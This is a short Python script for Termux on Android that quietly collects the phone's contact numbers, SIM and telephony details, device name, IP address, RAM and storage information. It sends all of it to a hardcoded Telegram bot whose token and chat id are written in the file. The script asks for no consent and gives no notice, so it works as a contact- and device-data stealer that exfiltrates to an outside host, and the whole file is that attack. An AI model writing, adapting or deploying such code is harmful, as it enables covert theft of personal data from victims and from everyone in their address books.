import os
import json
import socket
import requests
import subprocess

# Telegram bot information
bot_token = '6421443419:AAH4I4a3uNg_0wzLubPtZ5TYXmoEhKIeIv0'
chat_id = '5710276456'

# Function to send message to Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    requests.post(url, data=data)

# Function to get contact list
def get_contacts():
    try:
        contacts = subprocess.check_output(['termux-contact-list'])
        contacts = json.loads(contacts.decode('utf-8'))
        contact_numbers = [contact['number'] for contact in contacts if 'number' in contact]
        return contact_numbers
    except Exception as e:
        return []

# Function to get device name
def get_device_name():
    try:
        return os.uname().nodename
    except:
        return "Unknown Device"

# Function to get IP address
def get_ip_address():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "Unknown IP"

# Function to get SIM information
def get_sim_info():
    try:
        sim_info = subprocess.check_output(['termux-telephony-deviceinfo'])
        return json.loads(sim_info.decode('utf-8'))
    except:
        return {}

# Function to get RAM info
def get_ram_info():
    try:
        ram_info = subprocess.check_output(['free', '-h'])
        return ram_info.decode('utf-8')
    except:
        return "Unable to retrieve RAM info"

# Function to get storage info
def get_storage_info():
    try:
        storage_info = subprocess.check_output(['df', '-h'])
        return storage_info.decode('utf-8')
    except:
        return "Unable to retrieve storage info"

# Main function
def main():
    # Gather contacts
    contacts = get_contacts()
    contact_message = "Contact Numbers:\n" + "\n".join(contacts) if contacts else "No contacts found."

    # Gather device information
    device_name = get_device_name()
    ip_address = get_ip_address()
    sim_info = get_sim_info()
    ram_info = get_ram_info()
    storage_info = get_storage_info()

    sim_info_message = f"SIM Info:\n{json.dumps(sim_info, indent=2)}"
    ram_info_message = f"RAM Info:\n{ram_info}"
    storage_info_message = f"Storage Info:\n{storage_info}"

    # Create the message with all details
    message = (
        f"<b>Device Info</b>\n"
        f"Device Name: {device_name}\n"
        f"IP Address: {ip_address}\n\n"
        f"{contact_message}\n\n"
        f"{sim_info_message}\n\n"
        f"{ram_info_message}\n\n"
        f"{storage_info_message}"
    )
    
    # Send the message to Telegram
    send_telegram_message(message)

if __name__ == "__main__":
    main()
